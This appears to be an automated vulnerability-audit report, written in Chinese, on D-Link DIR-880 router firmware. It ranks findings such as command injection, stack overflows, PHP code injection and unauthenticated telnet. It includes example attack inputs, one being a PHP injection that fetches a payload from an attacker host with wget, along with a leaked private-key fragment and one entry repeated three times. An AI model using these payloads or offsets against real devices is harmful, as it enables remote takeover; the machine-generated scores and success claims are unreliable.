# _DIR-880 高优先级: 44 中优先级: 53 低优先级: 65

## 优先级评分模型

**计算公式:** `PriorityScore = (0.5 * risk_level) + (0.3 * confidence) + (0.2 * trigger_possibility)`

**分层策略:**
- **高优先级:** `PriorityScore >= 8.5`
- **中优先级:** `7.0 <= PriorityScore < 8.5`
- **低优先级:** `PriorityScore < 7.0`

---

## 高优先级发现

### attack_chain-env_pollution_http_rce

- **文件路径:** `htdocs/fileaccess.cgi`
- **位置:** `复合路径: htdocs/fileaccess.cgi→htdocs/cgibin`
- **类型:** network_input
- **综合优先级分数:** **9.65**
- **风险等级:** 9.8
- **置信度:** 9.5
- **触发可能性:** 9.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 完整HTTP环境变量污染攻击链：1) 通过HTTP_COOKIE/REMOTE_ADDR等头部污染环境变量 2) 多组件(fcn.000309c4/fcn.0000d17c)未验证环境变量长度导致栈溢出 3) 结合固件未启用ASLR特性实现稳定ROP攻击。触发步骤：单次HTTP请求包含超长恶意头部→污染环境变量→触发CGI组件栈溢出→劫持控制流执行任意命令。实际影响：远程无认证代码执行，成功概率>90%。
- **关键词:** HTTP_COOKIE, REMOTE_ADDR, getenv, strncpy, strcpy, ROP, ASLR
- **备注:** 关联漏洞：stack_overflow-network_input-fcn_000309c4 + stack_overflow-http_handler-remote_addr。关键证据：1) 两漏洞共享环境变量污染路径 2) 均未启用ASLR 3) 栈偏移计算精确可控

---
### network_input-telnetd-shell_access

- **文件路径:** `usr/sbin/telnetd`
- **位置:** `bin/telnetd:0x8f44 (fcn.00008f44)`
- **类型:** command_execution
- **综合优先级分数:** **9.6**
- **风险等级:** 9.8
- **置信度:** 9.0
- **触发可能性:** 10.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 未认证Telnet Shell访问漏洞：当telnetd未使用'-l'参数指定登录程序时（默认配置），程序在函数fcn.00008f44直接通过execv("/bin/sh")提供完整系统访问。攻击者连接telnet端口即可获得无认证shell权限。触发条件：服务以默认参数启动（无认证程序指定）。实际影响：攻击者获得等同于telnetd运行权限（通常为root）的系统控制权，风险等级极高。
- **代码片段:**
  ```
  sym.imp.execv(*(0x267c | 0x10000), 0x2680 | 0x10000);
  ```
- **关键词:** execv, /bin/sh, fcn.00008f44, telnetd启动参数, 0x8f44
- **备注:** 需验证固件启动脚本中telnetd参数配置。此为最优先修复项

---
### network_input-form_wlan_acl-php_code_injection

- **文件路径:** `htdocs/mydlink/form_wlan_acl`
- **位置:** `htdocs/mydlink/form_wlan_acl:未知行号 (dophp)`
- **类型:** network_input
- **综合优先级分数:** **9.6**
- **风险等级:** 10.0
- **置信度:** 9.0
- **触发可能性:** 9.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危PHP代码注入漏洞。当POST参数settingsChanged=1时，循环处理mac_$i/enable_$i参数，未经任何过滤直接通过fwrite写入临时PHP文件($tmp_file)，并通过dophp('load')执行。攻击者可注入任意PHP代码导致远程命令执行(RCE)。触发条件：发送恶意POST请求到form_wlan_acl，参数形如mac_1=';system("恶意命令");/*。边界检查完全缺失，输入直接拼接为PHP变量赋值语句。
- **代码片段:**
  ```
  fwrite("a", $tmp_file, "$MAC = $_POST[\"mac_.$i\"];\n");
  fwrite("a", $tmp_file, "$ENABLE = $_POST[\"enable_.$i\"];\n");
  dophp("load",$tmp_file);
  ```
- **关键词:** dophp, fwrite, $_POST, mac_$i, enable_$i, $tmp_file, runservice, settingsChanged, MAC, ENABLE
- **备注:** 需后续验证：1) dophp函数具体实现(可能在libservice.php) 2) Web服务权限级别 3) $tmp_file清理机制。此漏洞构成完整攻击链：网络输入→无过滤文件写入→代码执行，建议优先调查。

---
### command_execution-udev_event_run-0x1194c

- **文件路径:** `sbin/udevd`
- **位置:** `fcn.00011694@0x1194c`
- **类型:** command_execution
- **综合优先级分数:** **9.35**
- **风险等级:** 9.8
- **置信度:** 9.5
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危命令注入漏洞：udev_event_run函数（fcn.00011694）中execv调用直接使用未过滤的环境变量参数。触发条件：攻击者通过HTTP接口/进程间通信设置含恶意命令的环境变量（如'; rm -rf /'）。传播路径：外部输入→fcn.0000eb14（输入处理）→strlcpy复制→fcn.0000e4c0（格式化）→udev_event_run→execv执行。实际影响：root权限任意命令执行（CVSS 9.8）。边界检查：无元字符过滤或路径白名单验证。
- **代码片段:**
  ```
  sym.imp.execv(*(puVar16 + 0xfffff360), puVar16 + 0xfffff360);
  ```
- **关键词:** execv, udev_event_run, fcn.00011694, fcn.0000e4c0, fcn.0000eb14, strlcpy
- **备注:** 需确认具体环境变量名（建议后续分析fcn.0000eb14输入源）

---
### rce-form_macfilter-1

- **文件路径:** `htdocs/mydlink/form_macfilter`
- **位置:** `htdocs/mydlink/form_macfilter (关键行：fwrite和dophp调用处)`
- **类型:** network_input
- **综合优先级分数:** **9.3**
- **风险等级:** 9.8
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危远程代码执行漏洞：当访问form_macfilter端点并提交settingsChanged=1时，用户控制的$_POST参数(entry_enable_X/mac_X等)未经过滤直接写入/tmp/form_macfilter.php文件。dophp('load')加载执行该文件时导致任意代码执行。触发条件：1) 通过HTTP请求访问接口 2) 设置settingsChanged=1 3) 在entry_enable_X/mac_X等参数注入PHP代码（如：`;system("wget http://attacker/shell -O /tmp/sh");`）。实际影响：攻击者可获得设备root权限完全控制设备。
- **代码片段:**
  ```
  fwrite("a", $tmp_file, "$enable = $_POST[\"entry_enable_\".$i];\n");
  dophp("load",$tmp_file);
  ```
- **关键词:** dophp, load, $_POST, entry_enable_, mac_, settingsChanged, /tmp/form_macfilter.php, fwrite
- **备注:** 关联漏洞：1) form_wlan_acl存在相同漏洞模式(name: network_input-form_wlan_acl-php_code_injection) 2) wand.php/fatlady.php存在dophp文件包含漏洞。未解决问题：dophp函数具体实现未定位（需在/bin或/usr/bin目录搜索php-cgi）。后续建议：检查form_portforwarding等表单文件是否存在相同漏洞模式。

---
### stack_overflow-network_input-fcn_000309c4

- **文件路径:** `htdocs/fileaccess.cgi`
- **位置:** `fileaccess.cgi:0x000309c4 (fcn.000309c4)`
- **类型:** network_input
- **综合优先级分数:** **9.25**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危栈溢出漏洞（CWE-121）：在函数fcn.000309c4中，通过getenv('HTTP_COOKIE')获取外部输入，使用strncpy复制到64字节栈缓冲区(auStack_13c)时未验证源长度。触发条件：HTTP请求中Cookie长度>316字节时覆盖返回地址。攻击者可构造恶意Cookie精确控制PC寄存器，结合固件未启用ASLR的特性，通过ROP链绕过NX保护实现任意代码执行。实际安全影响：单次HTTP请求可导致远程命令执行，完整攻击链成立概率>90%。
- **代码片段:**
  ```
  iVar2 = sym.imp.getenv('HTTP_COOKIE');
  uVar3 = sym.imp.getenv('HTTP_COOKIE');
  sym.imp.strncpy(puVar6 + iVar1 + -0x138, iVar2 + 4, (iVar4 - 4) + 1);  // 无长度检查
  ```
- **关键词:** HTTP_COOKIE, getenv, strncpy, auStack_13c, fcn.000309c4, lr, ROP, NX
- **备注:** 关键证据：1) 栈帧分析显示返回地址偏移316字节 2) ELF头确认ASLR未启用(ET_EXEC) 3) 导入表存在system等危险函数

---
### command-injection-wand-activate

- **文件路径:** `htdocs/webinc/wand.php`
- **位置:** `wand.php:46-58`
- **类型:** command_execution
- **综合优先级分数:** **9.25**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 命令注入漏洞：当$ACTION=ACTIVATE时，代码直接拼接$svc/$event到系统命令（如'xmldbc -t "wand:$delay:event $event"'）。$svc/$event来自/runtime/services/dirty/service节点（由SETCFG写入），攻击者可构造含特殊字符的service/ACTIVATE_EVENT值。触发条件：1) 通过SETCFG写入恶意节点 2) 发送$ACTION=ACTIVATE请求。成功利用可执行任意命令（root权限），形成完整攻击链：HTTP请求→XML解析→命令执行。
- **代码片段:**
  ```
  writescript(a, 'xmldbc -t "wand:'.$delay.':event '.$event.'"\n');
  writescript("a", "service ".$svc." restart\n");
  ```
- **关键词:** $svc, $event, writescript, ACTIVATE, xmldbc, service, restart, ACTIVATE_EVENT, dirtysvcp, /runtime/services/dirty
- **备注:** 关键污点参数：$svc/$event。需追踪XML数据来源，确认是否暴露为API输入点

---
### command_execution-md_send_mail-0xc700

- **文件路径:** `usr/sbin/mydlinkeventd`
- **位置:** `mydlinkeventd:0xc700 (sym.md_send_mail)`
- **类型:** command_execution
- **综合优先级分数:** **9.25**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 在函数sym.md_send_mail中发现未过滤命令注入漏洞：1) 通过snprintf拼接命令'phpsh MYDLINKMAIL.php SUBJECTPATH="%s"'时，参数param_2(主机名)直接来自网络输入的新设备注册请求；2) 未对主机名进行特殊字符过滤或边界检查；3) 攻击者可构造恶意主机名(如';reboot;')注入命令，导致以root权限执行任意命令。触发条件：当设备收到格式为<IP>,<主机名>的新设备注册请求时自动触发邮件通知功能。利用概率高，因网络接口暴露且无认证要求。
- **代码片段:**
  ```
  snprintf(..., "phpsh %s SUBJECTPATH=\"%s\" ...", param1, param2);
  system(...);
  ```
- **关键词:** sym.md_send_mail, param_2, SUBJECTPATH, snprintf, system, /var/mydlink_mail_subject.txt, MYDLINKMAIL.php
- **备注:** 需验证：1) /var/mydlink_mail_subject.txt的写入机制 2) 其他调用lxmldbc_run_shell的场景

---
### persistence_attack-env_home_autoload

- **文件路径:** `bin/sqlite3`
- **位置:** `fcn.000112bc:0x11248, fcn.00010bf8:0x10bf8`
- **类型:** env_get
- **综合优先级分数:** **9.15**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 环境变量'HOME'污染导致自动执行恶意SQL。攻击者设置'HOME'指向可控目录，sqlite3自动加载并执行$HOME/.sqliterc文件内容。触发条件：启动sqlite3前'HOME'被污染（如通过NVRAM设置漏洞）。安全影响：持久化攻击链（文件污染→会话自动执行→数据库完全控制），风险等级极高。约束条件：需文件系统写入权限。
- **代码片段:**
  ```
  iVar1 = sym.imp.getenv(0x4140 | 0x10000);
  sym.imp.sqlite3_snprintf(..., "%s/.sqliterc", ...);
  sqlite3_exec(..., sql_command, ...);
  ```
- **关键词:** HOME, getenv, .sqliterc, sqlite3_exec, sqlite3_snprintf, fopen64
- **备注:** 攻击链：不可信输入→环境变量→文件路径→自动SQL执行。关键关联：与知识库中现有'HOME'相关发现形成完整攻击路径（如NVRAM漏洞→环境变量污染）

---
### network_input-CT_Command_Parser-stack_overflow

- **文件路径:** `mydlink/tsa`
- **位置:** `tsa:0x9408 (fcn.00009408) @ 分支4/9操作点`
- **类型:** network_input
- **综合优先级分数:** **9.15**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** CT_Command_Parser命令处理栈溢出漏洞：在分支4/9（命令类型2/3/4）中，strncpy操作将32字节数据复制到仅9-10字节剩余空间的栈缓冲区（auStack_c7/auStack_a6）。攻击者通过发送特定格式网络命令（如触发分支4的*0x9c8c模式命令），可精确覆盖栈帧关键数据。触发条件：1) 建立TCP连接 2) 发送包含目标命令前缀的payload 3) payload长度>目标缓冲区剩余空间。
- **代码片段:**
  ```
  // 危险复制操作示例
  strncpy(puVar15-0xaf, *0x9cb0, 0x20); // 目标缓冲区仅33B, 偏移-0xaf处剩余9B
  ```
- **关键词:** CT_Command_Parser, strncpy, puVar15-0xaf, puVar15-0x8e, auStack_c7, auStack_a6, *0x9cb0, *0x9cbc, CT_Command
- **备注:** 需动态验证命令前缀(*0x9c8c)具体值。溢出可覆盖返回地址(偏移计算见CT_Command_Recv分析)。攻击路径：网络输入 → recv(4096B缓冲区) → CT_Command_Parser命令分发 → 分支4/9 strncpy → 栈溢出控制流劫持。整体弱点：双重缺失保护（无输入长度验证+无栈溢出防护），可利用性高（8.0/10）

---
### global_overflow-signalc-tlv_fcn0001253c

- **文件路径:** `mydlink/signalc`
- **位置:** `signalc:0x12f34`
- **类型:** network_input
- **综合优先级分数:** **9.15**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** TLV数据处理全局缓冲区溢出：1) fcn.0001253c函数0x12f34处strcpy使用未经验证的网络输入(auStack_1002c) 2) 目标缓冲区(全局结构*0x13094+0x108)固定大小0x140字节 3) 攻击者可发送类型0x800的TLV包携带>320字节数据触发溢出 4) 触发条件：恶意TLV数据长度>320字节 5) 安全影响：覆盖含函数指针的相邻全局结构，高概率实现远程代码执行。
- **代码片段:**
  ```
  strcpy(*(global_struct_0x13094 + 0x108), auStack_1002c); // 缓冲区大小0x140字节
  ```
- **关键词:** fcn.0001253c, strcpy, TLV, 0x13094, 0x800, auStack_1002c, param_2
- **备注:** 关键验证点：全局结构0x13094内存布局及最近函数指针偏移。与现有攻击链'cross_component_attack_chain-param_2_servd'关联：param_2可能来自servd网络输入

---
### RCE-DNS-OPT-Parser

- **文件路径:** `bin/mDNSResponderPosix`
- **位置:** `mDNSResponderPosix:0x0001e3d0 (sym.GetLargeResourceRecord)`
- **类型:** network_input
- **综合优先级分数:** **9.15**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危远程代码执行漏洞：在DNS资源记录解析过程中，攻击者发送特制报文可使rdlength字段值（0xFFFF1234类）绕过边界检查：1) 未验证rdlength∈[0,260]即用于memcpy操作 2) 目标缓冲区auStack_128（260字节栈空间）溢出后精确覆盖返回地址（偏移292字节处）。触发条件：向设备53/UDP端口发送包含畸形OPT记录的DNS响应包。成功利用后果：完全控制设备执行流（通过ROP链绕过NX），形成完整攻击链：不可信网络输入→边界检查缺失→栈溢出→控制流劫持。
- **代码片段:**
  ```
  uVar6 = CONCAT11(puVar16[8], puVar16[9]);
  sym.mDNSPlatformMemCopy(auStack_128, puVar15, uVar6); // 无缓冲区长度校验
  ```
- **关键词:** GetLargeResourceRecord, rdlength, uVar6, memcpy, auStack_128, OPT, RDATA, mDNSCoreReceive, uDNS_ReceiveMsg
- **备注:** 漏洞模式匹配CVE-2017-3141。后续验证方向：1) 构建PoC触发崩溃确认偏移 2) 检查固件ASLR启用状态 3) 分析关联配置文件/etc/mdnsd.conf

---
### network_input-tsa-tunnel_stack_overflow

- **文件路径:** `mydlink/tsa`
- **位置:** `tsa:0x9f90 (fcn.00009d50)`
- **类型:** network_input
- **综合优先级分数:** **9.15**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 隧道通信协议高危栈溢出漏洞：攻击者通过TCP隧道发送含特定分隔符(0x2c)的数据包时，fcn.00009d50函数中recv接收数据后，错误计算(iVar3 = iVar11 + (iVar3 - iVar8))导致整数下溢，使后续recv调用使用超长长度参数(0x1000-极大值)，向4096字节栈缓冲区(auStack_12a8)写入超量数据。精确控制溢出长度和内容可实现任意代码执行。触发条件：1) 建立隧道连接 2) 发送含0x2c的特制包 3) 构造下溢计算。边界检查完全缺失。
- **代码片段:**
  ```
  iVar3 = sym.imp.recv(uVar9,iVar11,0x1000 - *(puVar14 + 0xffffed6c));
  iVar4 = sym.imp.strchr(iVar11,0x2c);
  iVar3 = iVar11 + (iVar3 - iVar8);
  *(puVar14 + 0xffffed6c) = iVar3;
  ```
- **关键词:** tunnel_protocol, recv, stack_overflow, auStack_12a8, 0x2c_delimiter, integer_underflow
- **备注:** 完整攻击链：网络输入->协议解析->边界计算错误->栈溢出。关联知识库关键词：recv, 0x1000, memmove

---
### stack_overflow-http_response_handler-proxyd_0xd25c

- **文件路径:** `usr/sbin/proxyd`
- **位置:** `proxyd:0xd25c (fcn.0000d25c)`
- **类型:** network_input
- **综合优先级分数:** **9.1**
- **风险等级:** 9.5
- **置信度:** 8.5
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危远程代码执行漏洞：在HTTP响应处理函数(fcn.0000d25c)中，recv接收外部数据到64字节栈缓冲区(偏移sp-0x5c)。当接收21-64字节数据时，后续null终止操作*(piVar4 + n + -0x44)=0会覆盖关键栈数据：21字节覆盖保存的r11寄存器(sp-8)，22字节覆盖返回地址(sp-4)。攻击者通过HTTP响应发送22字节恶意数据即可精确覆盖返回地址，实现控制流劫持。
- **代码片段:**
  ```
  iVar1 = sym.imp.recv(*piVar4, piVar4 + -0x44, 0x40, 0);
  piVar4[-1] = iVar1;
  *(piVar4 + piVar4[-1] + -0x44) = 0;
  ```
- **关键词:** fcn.0000d25c, recv, piVar4[-1], sp-8, sp-4, sym.imp.recv
- **备注:** 完整攻击路径：外部HTTP请求 → 核心处理循环 → fcn.0000d25c漏洞触发。需人工验证：1) 漏洞函数是否在HTTP主循环调用链 2) 实际栈布局是否匹配分析。关联知识库记录：stack_overflow-network_input-fcn_000309c4（相同输入机制）

---
### memory_corruption-connection_struct-oob_access-0xaf68

- **文件路径:** `usr/sbin/xmldbc`
- **位置:** `函数:0xaf68 @0xaf6c`
- **类型:** network_input
- **综合优先级分数:** **9.1**
- **风险等级:** 9.0
- **置信度:** 9.0
- **触发可能性:** 9.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危越界访问漏洞：全局连接结构体数组(基址0x3dd10，元素大小0x34，容量32)存在系统性边界检查缺失。触发条件：攻击者通过网络连接传入索引值>31或<0 → 经函数调用链(fcn.0000a0f4→fcn.0000a428→fcn.0000ba38→fcn.0000af68)传播 → 在关键操作点(fcn.0000a650/fcn.0000af68)执行未验证索引的敏感操作（关闭文件描述符/内存覆写）。安全影响：1) 拒绝服务（服务崩溃）2) 敏感内存泄露 3) 远程代码执行(RCE)。利用优势：传播链完整且外部输入可控性已确认。
- **代码片段:**
  ```
  *(int *)(param_1 * 0x34 + 0x3dd10) = 0;
  ```
- **关键词:** 0x3dd10, 0x34, fcn.0000a0f4, fcn.0000a428, fcn.0000ba38, fcn.0000af68, fcn.0000a650, sym.imp.close, sym.imp.memset
- **备注:** 需动态验证HTTP/IPC接口的索引参数处理逻辑

---
### command_execution-httpd-wan_ifname_mtu

- **文件路径:** `sbin/httpd.c`
- **位置:** `httpd.c:828 (get_cgi)`
- **类型:** command_execution
- **综合优先级分数:** **9.05**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 高危命令执行漏洞：通过污染NVRAM(wan_ifname)和发送HTTP请求(mtu参数)，攻击者可触发缓冲区溢出并执行任意命令。触发条件：1) 攻击者通过DHCP/PPPoE或认证后HTTP污染wan_ifname（最大256字节）；2) 发送未认证HTTP请求包含超长mtu值（>32字节）。具体路径：get_cgi()获取mtu值→拼接wan_ifname→strcpy到32字节栈缓冲区→溢出覆盖返回地址→控制system()参数。
- **代码片段:**
  ```
  char dest[32];
  strcpy(dest, s1);
  strcat(dest, s2); // s2=wan_ifname
  strcat(dest, value); // value=mtu
  system(dest);
  ```
- **关键词:** wan_ifname, nvram_safe_get, get_cgi, mtu, system
- **备注:** 溢出偏移计算：s1(4B)+wan_ifname(最大256B)+mtu(32B) > dest(32B)。需验证：1) 栈布局中返回地址偏移 2) system()参数是否可控。关联发现：知识库中已存在另一处system调用（htdocs/cgibin:cgibin:0xea2c），需检查是否共享相同输入源。

---
### attack_chain-env_to_sql_persistence

- **文件路径:** `htdocs/fileaccess.cgi`
- **位置:** `跨组件: bin/sqlite3 + 环境变量设置点`
- **类型:** env_get
- **综合优先级分数:** **9.05**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 环境变量持久化攻击链：污染环境变量（如HOME）→ 诱导sqlite3加载恶意配置文件 → 自动执行SQL命令实现持久化控制。触发条件：通过NVRAM或网络接口设置恶意环境变量。实际影响：系统级后门植入，风险等级极高。
- **关键词:** HOME, .sqliterc, sqlite3_exec, getenv, NVRAM
- **备注:** 关联漏洞：persistence_attack-env_home_autoload。需验证：1) NVRAM设置环境变量机制 2) Web接口是否暴露环境变量设置功能

---
### rce-stack_overflow-wan_ip_check

- **文件路径:** `usr/sbin/fileaccessd`
- **位置:** `bin/fileaccessd:0 [fcn.0000f748] 0xf748`
- **类型:** network_input
- **综合优先级分数:** **9.05**
- **风险等级:** 9.2
- **置信度:** 9.5
- **触发可能性:** 8.0
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 高危远程代码执行漏洞（CWE-121）：在WAN IP检查功能中，fileaccessd通过popen执行`wget -T 2 http://checkip.dyndns.org`获取外部IP。解析HTTP响应时，循环使用`sprintf(param_1, "%s%c", param_1, char)`将合法字符（数字和点）追加到64字节栈缓冲区。攻击者通过中间人攻击篡改HTTP响应，在<body>后注入超长数字串（>64字节），可覆盖栈上返回地址。触发条件：1) 设备启用WAN IP检查（由定时任务fcn.0000a1f4每600秒触发）2) 攻击者在特定时间窗口劫持HTTP响应（-T 2参数限制响应时间<2秒）。
- **代码片段:**
  ```
  sym.imp.sprintf(piVar5[-0x4e], 0x374c | 0x10000, piVar5[-0x4e], *piVar5[-2]);
  ```
- **关键词:** fcn.0000f748, popen, sprintf, param_1, wget -T 2 http://checkip.dyndns.org, strstr, <body>, alarm, /runtime/webaccess/wan_ext_ip, MiTM_attack, timer_task
- **备注:** 漏洞利用链：不可信输入点（HTTP响应）→危险操作（sprintf栈溢出）。完整攻击路径：公共网络（劫持HTTP）→ fileaccessd定时任务→ wget输出解析→缓冲区溢出→RCE。公共WiFi环境成功率>80%。待验证：1) fileaccessd进程权限 2) 精确溢出偏移计算。未解决问题：system/popen调用链关联性验证（地址0xf624/0xf640超出.text段）

---
### stack_overflow-servd_network-0xb870

- **文件路径:** `usr/sbin/servd`
- **位置:** `usr/sbin/servd:0xb870 (fcn.0000b870)`
- **类型:** network_input
- **综合优先级分数:** **9.05**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危栈溢出漏洞：servd通过事件循环(fcn.0001092c)接收外部网络数据，经处理函数fcn.00009798传递到fcn.0000b870。该函数使用strcpy将完全可控的param_2参数复制到固定8192字节栈缓冲区(auStack_200c)，无任何长度校验。触发条件：攻击者向servd监听端口发送>8192字节恶意数据。利用方式：精心构造溢出数据覆盖返回地址，可实现任意代码执行。实际影响：结合固件常见开放服务（如UPnP/TR-069），攻击者可通过网络远程触发，成功率较高。
- **代码片段:**
  ```
  sym.imp.strcpy(piVar4 + 0 + -0x2000, *(piVar4 + (0xdfd8 | 0xffff0000) + 4));
  ```
- **关键词:** fcn.0000b870, param_2, strcpy, auStack_200c, fcn.0000d2d0, piVar5[-4]+0xc, fcn.00009798, unaff_r11-0x294, fcn.0001092c, select
- **备注:** 需动态验证：1) 实际开放端口 2) 最小触发数据长度 3) ASLR绕过可行性

---
### env_set-telnetd-ALWAYS_TN_backdoor

- **文件路径:** `etc/init0.d/S80telnetd.sh`
- **位置:** `S80telnetd.sh:5-7`
- **类型:** env_set
- **综合优先级分数:** **9.05**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 当环境变量ALWAYS_TN=1时，脚本启动无认证telnetd服务（'telnetd -i br0'），允许任意攻击者通过br0接口直接获得root shell。此配置绕过所有认证机制，触发条件仅为ALWAYS_TN变量值为1。结合设备通常暴露br0接口的特性，此漏洞可被远程利用，成功概率极高。
- **代码片段:**
  ```
  if [ "$1" = "start" ] && [ "$entn" = "1" ]; then
      telnetd -i br0 -t 99999999999999999999999999999 &
  ```
- **关键词:** ALWAYS_TN, telnetd, -i br0, entn, devdata get -e ALWAYS_TN
- **备注:** 关联线索：知识库存在'devdata get -e ALWAYS_TN'操作（linking_keywords）。需追踪ALWAYS_TN变量来源（可能通过nvram_set/env_set操作设置）

---
### heap_overflow-minidlna-html_entity_filter

- **文件路径:** `usr/bin/minidlna`
- **位置:** `fcn.0001faec:0x1fb3c-0x1fb50`
- **类型:** network_input
- **综合优先级分数:** **9.0**
- **风险等级:** 9.2
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 攻击者通过上传包含大量HTML实体字符（如'&Amp;'）的文件名，触发minidlna目录扫描。扫描过程中调用fcn.0001fffc进行HTML实体过滤时，由于未限制实体数量且替换长度计算未防整数溢出，导致fcn.0001faec函数内memmove操作发生堆缓冲区溢出。触发条件：文件名需包含>1000个变体HTML实体字符。成功利用可导致远程代码执行。
- **代码片段:**
  ```
  iVar5 = sym.imp.realloc(param_1,(iVar2 - iVar1) * unaff_r4 + iVar5 + 1);
  sym.imp.memmove(iVar4 + iVar2,iVar4 + iVar1,iVar3 + 1);
  ```
- **关键词:** scandir64, fcn.0001fffc, fcn.0001faec, memmove, realloc, param_1, pcVar4, unaff_r4, 0x0003c3d8, 0x0003c3dc
- **备注:** 需验证HTTP接口文件上传功能是否允许控制文件名。边界检查缺失：1) 未限制HTML实体数量 2) (iVar2 - iVar1)*unaff_r4计算未防整数溢出

---
### configuration_load-stunnel_private_key-global_read

- **文件路径:** `etc/stunnel.conf`
- **位置:** `/etc/stunnel.key`
- **类型:** configuration_load
- **综合优先级分数:** **9.0**
- **风险等级:** 9.0
- **置信度:** 10.0
- **触发可能性:** 7.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 全局可读私钥导致中间人攻击风险：/etc/stunnel.key权限设置为777，任何系统用户均可读取RSA私钥。触发条件：攻击者通过其他漏洞（如Web RCE）获得低权限shell访问。边界检查：无权限控制机制。安全影响：攻击者可解密SSL/TLS通信、伪造服务端身份或进行主动中间人攻击，结合初始漏洞可形成完整攻击链。
- **代码片段:**
  ```
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpAIBAAKCAQEAo/0bZcpc3Npc89YiNcP+kPxhLCGLmYXR4rHLt2I1BbnkXWHk
  MY1
  ```
- **关键词:** stunnel.key, key, RSA PRIVATE KEY, /etc/stunnel.key
- **备注:** 关联攻击链：远程代码执行漏洞→低权限shell→私钥窃取→中间人攻击

---
### xml-injection-DEVICE.LOG.xml.php-2

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php`
- **位置:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php:2`
- **类型:** network_input
- **综合优先级分数:** **8.95**
- **风险等级:** 9.0
- **置信度:** 9.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 高危XML注入漏洞：$GETCFG_SVC变量（来自HTTP请求的'service'节点）未经任何过滤直接输出到<service>标签。攻击者通过污染'service'参数可：a) 注入恶意XML标签破坏文档结构；b) 实施XSS攻击；c) 结合wand.php的文件包含漏洞形成利用链。触发条件：发送包含恶意XML内容的HTTP请求（如service=<script>）。约束条件：需前端控制器（如wand.php）将参数传递至本文件。实际影响：可导致服务端请求伪造(SSRF)或作为命令注入跳板（结合已知漏洞）。
- **代码片段:**
  ```
  <service><?=$GETCFG_SVC?></service>
  ```
- **关键词:** GETCFG_SVC, service, wand.php, SETCFG, ACTIVATE, query("service")
- **备注:** 完整利用链：HTTP请求 → 本文件XML注入 → wand.php文件包含 → 命令注入（root权限）。需验证/phplib/setcfg目录权限；关联发现：知识库中已存在SETCFG/ACTIVATE相关操作（如NVRAM设置）

---
### xml-injection-DEVICE.LOG.xml.php-2

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php`
- **位置:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php:2`
- **类型:** network_input
- **综合优先级分数:** **8.95**
- **风险等级:** 9.0
- **置信度:** 9.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 高危XML注入漏洞：$GETCFG_SVC变量（来自HTTP请求的'service'节点）未经任何过滤直接输出到<service>标签。攻击者通过污染'service'参数可：a) 注入恶意XML标签破坏文档结构；b) 实施XSS攻击；c) 结合wand.php的文件包含漏洞形成利用链。触发条件：发送包含恶意XML内容的HTTP请求（如service=<script>）。约束条件：需前端控制器（如wand.php）将参数传递至本文件。实际影响：可导致服务端请求伪造(SSRF)或作为命令注入跳板（结合已知漏洞）。
- **代码片段:**
  ```
  <service><?=$GETCFG_SVC?></service>
  ```
- **关键词:** GETCFG_SVC, service, wand.php, SETCFG, ACTIVATE, query("service")
- **备注:** 完整利用链：HTTP请求 → 本文件XML注入 → wand.php文件包含 → 命令注入（root权限）。需验证/phplib/setcfg目录权限；关联发现：知识库中已存在SETCFG/ACTIVATE相关操作（如NVRAM设置）；关键风险：wand.php文件包含漏洞尚未在知识库中确认

---
### xml-injection-DEVICE.LOG.xml.php-2

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php`
- **位置:** `htdocs/webinc/getcfg/DEVICE.LOG.xml.php:2`
- **类型:** network_input
- **综合优先级分数:** **8.95**
- **风险等级:** 9.0
- **置信度:** 9.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** verify_xml-injection-DEVICE.LOG.xml.php-2
